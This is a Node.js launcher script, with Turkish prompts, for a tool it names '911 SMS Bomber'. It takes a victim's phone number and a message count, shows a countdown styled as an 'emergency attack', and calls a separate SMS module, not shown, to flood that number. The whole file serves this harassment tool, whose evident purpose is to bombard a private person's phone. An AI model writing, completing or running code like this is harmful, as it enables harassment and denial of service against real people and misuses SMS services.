const rl = require('readline-sync');
const colors = require('colors');
const title = require('./modules/title.js');
const nineOneOne = require('./modules/sms.js'); // Modül ismini 911 ruhuna uygun güncelledik
const { printBanner, printHackerLine, printStats } = require('./modules/ascii.js');
const { loadingAnimation, typeWriter } = require('./modules/animations.js');

global.request = require('request');
global.axios = require('axios');
global.faker = require('faker');
global.dayjs = require('dayjs');
global.fs = require('fs');
global.chalk = require('chalk');

async function main() {
    printBanner(); // Senin o meşhur 911 banner'ın burada basılacak
    
    await loadingAnimation('911 Altyapisi hazirlaniyor', 2000);
    await loadingAnimation('Proxy ve Hedefleme sistemleri yukleniyor', 1500);
    await loadingAnimation('Güvenli baglanti saglaniyor', 2000);
    
    console.log(chalk.red.bold('\n[SISTEM] 911 SMS BOMBER V1.0 AKTIF - ERAYVIRTUALX\n'));
    
    console.log(chalk.red('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
    let telefon = rl.question(chalk.red.bold('[HEDEF] ') + chalk.white('Telefon numarasini girin (5xx): '));
    
    if (telefon.length != 10) {
        console.log(chalk.red.bold('❌ [HATA] Numara 10 haneli olmalidir. Ornek: 5401234567'));
        process.exit(1);
    }
    
    title('911 SMS Bomber - Target: ' + telefon);
    
    console.log(chalk.red('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
    let miktar = rl.question(chalk.red.bold('[GÜÇ] ') + chalk.white('Gonderilecek SMS adedi: '));
    
    if(isNaN(miktar)) {
        console.log(chalk.red.bold('❌ [HATA] Gecerli bir sayı giriniz!'));
        process.exit(1);
    }
    
    if (miktar.length == 0) {
        console.log(chalk.red.bold('❌ [HATA] Miktar belirtilmedi!'));
        process.exit(1);
    }
    
    title(`911 BOMBER | Hedef: ${telefon} | Miktar: ${miktar}`);
    
    printStats(telefon, miktar);
    
    console.log(chalk.red.bold('\n🚀 ACIL DURUM SALDIRISI ICIN GERI SAYIM...'));
    for(let i = 3; i > 0; i--) { // Beklemeyi 5'ten 3'e çektim ki daha seri olsun
        console.log(chalk.red.bold(`[${i}] HAZIR OL...`));
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    console.log(chalk.green.bold('\n🔥 911 SMS BOMBER V1.0 BASLATILDI - SISTEM YUKLENIYOR 🔥\n'));
    
    // Ana bombardıman fonksiyonunu çağırıyoruz
    await nineOneOne(telefon, miktar);
}

main().catch(error => {
    console.log(chalk.red.bold("\n[KRITIK HATA]: " + error));
});
